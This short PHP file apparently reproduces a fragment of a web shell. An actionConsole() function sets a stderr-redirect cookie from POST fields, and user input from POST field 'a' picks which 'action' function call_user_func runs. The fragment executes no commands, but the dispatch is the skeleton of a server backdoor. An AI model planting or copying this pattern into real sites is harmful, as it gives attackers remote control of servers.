<?php
function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        setcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
 
    } elseif(!empty($_POST['p1']))
        setcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
}

if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);

echo "end";
?>